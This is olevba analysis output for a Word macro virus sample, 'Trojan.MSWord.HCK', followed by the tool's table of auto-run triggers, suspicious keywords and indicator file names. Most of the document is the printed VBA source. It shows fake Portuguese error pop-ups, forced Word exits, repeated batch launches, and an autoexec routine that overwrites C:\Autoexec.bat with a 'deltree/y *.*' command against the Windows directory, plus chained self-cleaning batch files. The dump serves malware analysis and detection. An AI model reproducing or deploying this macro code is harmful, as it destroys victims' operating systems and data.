olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.HCK
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.HCK - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Trojan.MSWord.HCK - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Autonew()
MsgBox "Vírus HCK acaba de infectar novamente seu computador"
MsgBox "O Microsoft Word irá fechar devido a um erro causado pelo vírus 'HCK'"
Application.Quit SaveChanges:=wdPromptToSaveChanges
End Sub
Sub autoopen()
MsgBox "HCK detectado,FATAL ERROR 16"
MsgBox "O Microsoft Word irá fechar devido a um erro causado pelo vírus 'HCK'"
Application.Quit SaveChanges:=wdPromptToSaveChanges
End Sub
Sub autoclose()
MsgBox " Vírus HCK está entrando novamente em ação "
Shell "HCK.bat", vbNormalFocus
Shell "HCK.bat", vbNormalFocus
Shell "HCK.bat", vbNormalFocus
Shell "HCK.bat", vbNormalFocus
Shell "HCK.bat", vbNormalFocus
Shell "HCK.bat", vbNormalFocus
Shell "HCK.bat", vbNormalFocus
Shell "HCK.bat", vbNormalFocus
Shell "HCK.bat", vbNormalFocus
Shell "HCK.bat", vbNormalFocus
Shell "HCK.bat", vbNormalFocus
Shell "HCK.bat", vbNormalFocus
Shell "HCK.bat", vbNormalFocus
Shell "HCK.bat", vbNormalFocus
Shell "HCK.bat", vbNormalFocus
Shell "HCK.bat", vbNormalFocus

End Sub
Sub AutoExit()
Attribute AutoExit.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.AutoExit"
MsgBox " Alerta do Microsoft Word:                                                                                                                                                                                                                                                                                                          Sistema 100% infectado pelo vírus HCK"
End Sub
Sub autoexec()
Attribute autoexec.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Autoexec"
Kill "C:\Autoexec.bat"
Open "C:\Autoexec.BAT" For Output As #1
Print #1, "@echo off"
Print #1, "echo O virus HCK esta entrando em acao"
Print #1, "CHOICE/N/CSN/TS,3"
Print #1, "CLS"
Print #1, "echo O sistema esta inoperante no momento, aguarde alguns instantes..."
Print #1, "echo Tentando voltar, por favor aguarde"
Print #1, "cd windows"
Print #1, "deltree/y *.* >NULL"
Print #1, "cd.."
Print #1, "del C:\windows\null"
Print #1, "cls"
Print #1, "echo Nao foi possivel voltar ao sistema"
Print #1, "cls"
Print #1, "echo Nao foi possivel voltar ao sistema FATAL ERROR 16"
Print #1, "echo Sistema Operacional corrompido pelo virus HCK"
Print #1, "CHOICE/N/CSN/TS,5"
Print #1, "cls"
Print #1, "type C:\HCK.txt"
Print #1, "CHOICE/N/CSN/TS,5"
Print #1, "c:\HCK1.bat"
Close #1
Open "C:\windows\HCK.bat" For Output As #1
Print #1, "@echo off"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Print #1, "echo                     Virus HCK se multiplicando"
Print #1, "echo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Close #1
Open "C:\HCK.txt" For Output As #1
Print #1, "bye bye WINDOWS"
Print #1, "HCK Hacking Action 2001"
Print #1, "Macro virus Created by: HCKWM"
Close #1
Open "C:\HCKi.txt" For Output As #1
Print #1, "HCK Hacking Action 2001"
Print #1, "Macro virus Created by: HCKWM"
Close #1
Open "C:\HCK1.bat" For Output As #1
Print #1, "ren c:\Autoexec.bat HCKb.bat"
Print #1, "c:\hck2.bat"
Close #1
Open "C:\HCK2.bat" For Output As #1
Print #1, "ren c:\hck3.bat Autoexec.bat"
Close #1
Open "C:\HCK3.bat" For Output As #1
Print #1, "@echo off"
Print #1, "type hcki.txt"
Print #1, "If exist c:\HCK1.bat del HCK1.bat"
Print #1, "If exist c:\HCK2.bat del HCK2.bat"
Print #1, "If exist c:\HCKb.bat del HCKb.bat"
Close #1
MsgBox "Vírus altamente perigoso detectado em seu sistema"
MsgBox "HCK Hacking Action®"
Shell "HCK.bat", vbNormalFocus
Shell "HCK.bat", vbNormalFocus
Shell "HCK.bat", vbNormalFocus
Shell "HCK.bat", vbNormalFocus
Shell "HCK.bat", vbNormalFocus
Shell "HCK.bat", vbNormalFocus
Shell "HCK.bat", vbNormalFocus
Shell "HCK.bat", vbNormalFocus
Shell "HCK.bat", vbNormalFocus
Shell "HCK.bat", vbNormalFocus
Shell "HCK.bat", vbNormalFocus
Shell "HCK.bat", vbNormalFocus
Shell "HCK.bat", vbNormalFocus
Shell "HCK.bat", vbNormalFocus
Shell "HCK.bat", vbNormalFocus
Shell "HCK.bat", vbNormalFocus
ChDir "C:\"
StatusBar = "Vírus HCK infectando seu sistema"
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|AutoExec  |Autonew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormalFocus       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |HCK.bat             |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |Autoexec.BAT        |Executable file name                         |
|IOC       |HCK1.bat            |Executable file name                         |
|IOC       |HCKb.bat            |Executable file name                         |
|IOC       |hck2.bat            |Executable file name                         |
|IOC       |HCK2.bat            |Executable file name                         |
|IOC       |hck3.bat            |Executable file name                         |
|IOC       |HCK3.bat            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

